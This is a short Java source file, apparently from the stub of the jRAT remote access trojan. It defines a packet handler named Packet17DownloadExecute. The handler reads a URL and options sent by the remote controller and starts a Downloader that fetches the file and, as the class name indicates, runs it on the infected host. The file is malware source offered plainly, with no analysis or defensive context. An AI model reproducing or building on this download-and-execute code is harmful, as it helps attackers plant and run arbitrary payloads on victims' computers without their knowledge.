package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		String type = con.readLine();
		boolean readFromSocket = con.readBoolean();

		new Downloader(con, url, false, type, readFromSocket).start();
	}

}